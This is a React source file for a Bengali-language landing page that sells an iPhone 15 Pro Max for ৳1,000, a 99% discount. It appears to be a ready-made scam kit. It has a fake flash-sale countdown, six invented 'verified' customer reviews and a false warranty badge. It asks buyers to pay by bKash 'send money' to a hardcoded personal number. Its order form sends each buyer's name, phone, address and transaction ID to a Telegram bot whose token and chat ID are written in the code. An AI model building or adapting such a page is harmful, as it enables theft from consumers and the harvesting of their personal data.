import React, { useState, useEffect } from 'react';

const PremiumLandingPage = () => {
  const [timeLeft, setTimeLeft] = useState(1800);
  const [currentImg, setCurrentImg] = useState(0);
  const [selectedColor, setSelectedColor] = useState('Natural Titanium');
  const [showPopup, setShowPopup] = useState(false);
  const [formData, setFormData] = useState({ name: '', phone: '', address: '', trxId: '' });

  // --- আপনার তথ্যগুলো এখানে বসান ---
  const BOT_TOKEN = "8354299407:AAFKUoOn9W3EdyIHpTljauF3VN_Ed3HihxQ"; 
  const CHAT_ID = "5085997009"; 
  const MY_BKASH_NUMBER = "01870428306"; 
  // ------------------------------

  const images = [
    "https://i.ibb.co.com/gbyH4tY2/50a71c0303bca79fc4d2fae2ca50cfd1.png", // আপনার সেই ডিরেক্ট লিঙ্ক
    "https://i.ibb.co.com/jvvx7964/7027ce0fdbb92010a312f4814bb04afc.png",
    "https://i.ibb.co.com/bgBP1D78/3f82de66235c46865d5276b1b69ba22f.png",
    "https://i.ibb.co.com/ccCJWnFt/pngwing-com.png",
    "https://i.ibb.co.com/hFDwZyLZ/90f5aa1b9a9a95892ef87d1833319da8.png"
  ];

  useEffect(() => {
    const slideTimer = setInterval(() => {
      setCurrentImg((prev) => (prev === images.length - 1 ? 0 : prev + 1));
    }, 3000);
    return () => clearInterval(slideTimer);
  }, [images.length]);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft(timeLeft - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (s) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, '0')}`;

  const handleOrder = async (e) => {
    e.preventDefault();
    const message = `🚀 **নতুন প্রিমিয়াম অর্ডার!**\n━━━━━━━━━━━━━\n👤 নাম: ${formData.name}\n📞 নাম্বার: ${formData.phone}\n🎨 কালার: ${selectedColor}\n🏠 ঠিকানা: ${formData.address}\n💰 TrxID: ${formData.trxId}\n━━━━━━━━━━━━━`;
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
      });
      setShowPopup(true);
    } catch (err) { alert("সমস্যা হয়েছে, আবার চেষ্টা করুন।"); }
  };

  return (
    <div className="bg-gray-50 min-h-screen text-gray-900 font-sans pb-32 overflow-x-hidden">
      <div className="bg-red-600 text-white text-center py-2 sticky top-0 z-50 font-bold text-sm shadow-md">
        ফ্ল্যাশ সেল শেষ হতে বাকি: {formatTime(timeLeft)} মিনিট
      </div>

      {/* ইমেজ স্লাইডার (ছবি না কাটার জন্য আপডেট করা হয়েছে) */}
      <div className="relative w-full bg-white overflow-hidden shadow-inner">
        <div className="flex transition-transform duration-700 ease-in-out" style={{ transform: `translateX(-${currentImg * 100}%)`, width: `${images.length * 100}%` }}>
          {images.map((img, i) => (
            <div key={i} className="w-full flex-shrink-0 flex justify-center items-center bg-white">
              <img 
                src={img} 
                className="w-full h-auto max-h-[450px] object-contain" 
                alt={`iPhone ${i + 1}`} 
              />
            </div>
          ))}
        </div>
        {/* স্লাইড ইন্ডিকেটর ডট */}
        <div className="absolute bottom-4 left-1/2 -translate-x-1/2 flex gap-1">
          {images.map((_, i) => (
            <div key={i} className={`h-1.5 rounded-full transition-all ${currentImg === i ? 'w-4 bg-blue-600' : 'w-1.5 bg-gray-300'}`}></div>
          ))}
        </div>
      </div>

      <div className="p-5 bg-white rounded-b-[40px] shadow-lg">
        <div className="flex justify-between items-start">
          <h1 className="text-2xl font-black leading-tight text-gray-800">iPhone 15 Pro Max <br/><span className="text-gray-400 text-sm font-normal">256GB, Titanium Edition</span></h1>
          <span className="bg-red-100 text-red-600 text-[10px] font-bold px-2 py-1 rounded-full uppercase">অফিসিয়াল ওয়ারেন্টি</span>
        </div>
        
        <div className="mt-4 flex items-baseline gap-3">
          <span className="text-4xl font-black text-blue-600">৳ ১,০০০</span>
          <span className="text-lg text-gray-400 line-through">৳ ১,৫৯,০০০</span>
          <span className="text-green-600 font-bold text-sm">(-৯৯%)</span>
        </div>

        <div className="mt-6">
          <p className="text-sm font-bold text-gray-600 mb-3 underline">কালার ভেরিয়েন্ট পছন্দ করুন:</p>
          <div className="flex gap-3">
            {['Natural Titanium', 'Blue Titanium', 'Black Titanium'].map(color => (
              <button 
                key={color}
                onClick={() => setSelectedColor(color)}
                className={`px-4 py-2 rounded-xl text-xs font-bold border-2 transition-all ${selectedColor === color ? 'border-blue-600 bg-blue-50 text-blue-600 shadow-md' : 'border-gray-200 bg-gray-50 text-gray-500'}`}
              >
                {color}
              </button>
            ))}
          </div>
        </div>
      </div>

      <div className="p-6">
        <h2 className="text-xl font-black mb-4">ফোনের ফিচারসমূহ:</h2>
        <div className="grid grid-cols-2 gap-4">
          <div className="bg-blue-50 p-4 rounded-2xl border border-blue-100 text-center">
            <p className="text-xs text-blue-600 font-bold uppercase">ডিসপ্লে</p>
            <p className="text-sm font-black mt-1">6.7" Super Retina XDR</p>
          </div>
          <div className="bg-purple-50 p-4 rounded-2xl border border-purple-100 text-center">
            <p className="text-xs text-purple-600 font-bold uppercase">প্রসেসর</p>
            <p className="text-sm font-black mt-1">A17 Pro Chip</p>
          </div>
          <div className="bg-green-50 p-4 rounded-2xl border border-green-100 text-center">
            <p className="text-xs text-green-600 font-bold uppercase">ক্যামেরা</p>
            <p className="text-sm font-black mt-1">48MP Main Camera</p>
          </div>
          <div className="bg-orange-50 p-4 rounded-2xl border border-orange-100 text-center">
            <p className="text-xs text-orange-600 font-bold uppercase">বডি</p>
            <p className="text-sm font-black mt-1">Grade 5 Titanium</p>
          </div>
        </div>
      </div>

      <div className="p-6 bg-white rounded-t-[40px] shadow-inner mt-6">
        <h2 className="text-xl font-black mb-6 flex items-center gap-2">কাস্টমার রিভিউ <span className="text-gray-400 text-sm font-normal">(ভেরিফাইড)</span></h2>
        <div className="space-y-6">
          {[
            { n: "তানভীর আহমেদ", t: "১০০০ টাকায় আইফোন পাবো এটা স্বপ্নের মতো লাগছে!", l: "ঢাকা", i: "https://i.ibb.co.com/p6yKw8mK/vzfw2.jpg?u=1" },
            { n: "ফারহানা আক্তার", t: "প্যাকিং খুব প্রিমিয়াম ছিল। সেলারকে ধন্যবাদ!", l: "সিলেট", i: "https://i.ibb.co.com/tTZjTHc1/fsgsgere.jpg?u=2" },
            { n: "নিলয় বড়ুয়া", t: "ভেবেছিলাম ভুয়া, কিন্তু ২ দিনের মধ্যে হাতে পেয়ে গেলাম।", l: "চট্টগ্রাম", i: "https://i.ibb.co.com/TB7gWY1w/wretey4.jpg?u=3" },
            { n: "সজীব হোসেন", t: "অবিশ্বাস্য অফার! সব ঠিকঠাক পেয়েছি।", l: "রাজশাহী", i: "https://i.ibb.co.com/FkHbFhJB/wyryryryry3.jpg?u=4" },
            { n: "রাইসা ইসলাম", t: "কালারটা জাস্ট দারুণ। ১০০০ টাকায় এমন ফোন দেওয়ার জন্য ধন্যবাদ।", l: "খুলনা", i: "https://i.ibb.co.com/RpbQ8JwR/agsge4.jpg?u=5" },
            { n: "জুবায়ের আহমেদ", t: "আজ হাতে পেলাম। একদম অরিজিনাল প্রোডাক্ট।", l: "বরিশাল", i: "https://i.ibb.co.com/rfskLyVV/erty.jpg?u=6" }
          ].map((r, idx) => (
            <div key={idx} className="border-b pb-4 last:border-0">
              <div className="flex items-center gap-3 mb-2">
                <img src={r.i} className="w-10 h-10 rounded-full border border-gray-200" alt="user" />
                <div>
                  <h4 className="text-sm font-bold flex items-center gap-1">{r.n} <span className="text-[10px] bg-green-100 text-green-600 px-1 rounded">✔ ভেরিফাইড</span></h4>
                  <p className="text-[10px] text-gray-500">{r.l}</p>
                </div>
              </div>
              <div className="text-yellow-400 text-[10px] mb-1">★★★★★</div>
              <p className="text-sm text-gray-600 leading-relaxed italic">"{r.t}"</p>
            </div>
          ))}
        </div>

        <div id="order" className="mt-12 bg-gray-50 p-6 rounded-3xl border-2 border-blue-200">
          <h3 className="text-xl font-black text-center text-gray-800 mb-6">অর্ডার ফর্ম</h3>
          <form onSubmit={handleOrder} className="space-y-4">
            <input type="text" placeholder="পূর্ণ নাম" className="w-full p-4 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 outline-none" onChange={(e) => setFormData({...formData, name: e.target.value})} required />
            <input type="tel" placeholder="মোবাইল নাম্বার" className="w-full p-4 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 outline-none" onChange={(e) => setFormData({...formData, phone: e.target.value})} required />
            <textarea placeholder="বিস্তারিত ঠিকানা" className="w-full p-4 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 outline-none" rows="2" onChange={(e) => setFormData({...formData, address: e.target.value})} required></textarea>
            
            <div className="bg-blue-600 text-white p-5 rounded-2xl shadow-lg">
              <p className="text-xs opacity-80 mb-1 font-bold">বিকাশ ১,০০০৳ (সেন্ড মানি) করুন:</p>
              <p className="text-2xl font-black tracking-widest">{MY_BKASH_NUMBER}</p>
              <input type="text" placeholder="ট্রানজাকশন আইডি দিন (TrxID)" className="w-full p-3 mt-4 bg-white text-gray-900 rounded-lg font-bold" onChange={(e) => setFormData({...formData, trxId: e.target.value})} required />
            </div>
            
            <button className="w-full bg-blue-700 text-white py-5 rounded-2xl font-black text-xl shadow-xl active:scale-95 transition-all">অর্ডার কনফার্ম করুন</button>
          </form>
        </div>
      </div>

      <div className="fixed bottom-0 left-0 right-0 p-4 bg-white/80 backdrop-blur-lg border-t z-50">
        <button onClick={() => document.getElementById('order').scrollIntoView({behavior: 'smooth'})} className="w-full bg-green-500 text-white py-4 rounded-2xl text-xl font-black shadow-2xl animate-pulse uppercase">BUY NOW</button>
      </div>

      {showPopup && (
        <div className="fixed inset-0 bg-black/90 flex items-center justify-center z-[100] p-6">
          <div className="bg-white p-10 rounded-[40px] text-center shadow-2xl border-4 border-green-500 animate-bounce">
            <div className="text-7xl mb-4">✅</div>
            <h2 className="text-3xl font-black text-green-600 mb-2">অর্ডার সফল হয়েছে!</h2>
            <p className="text-gray-600 font-medium">আপনার পেমেন্ট ভেরিফাই করা হচ্ছে। ২-৩ দিনের মধ্যে ডেলিভারি পেয়ে যাবেন। ধন্যবাদ!</p>
            <button onClick={() => setShowPopup(false)} className="mt-8 w-full bg-gray-900 text-white py-4 rounded-2xl font-bold uppercase">close</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default PremiumLandingPage;
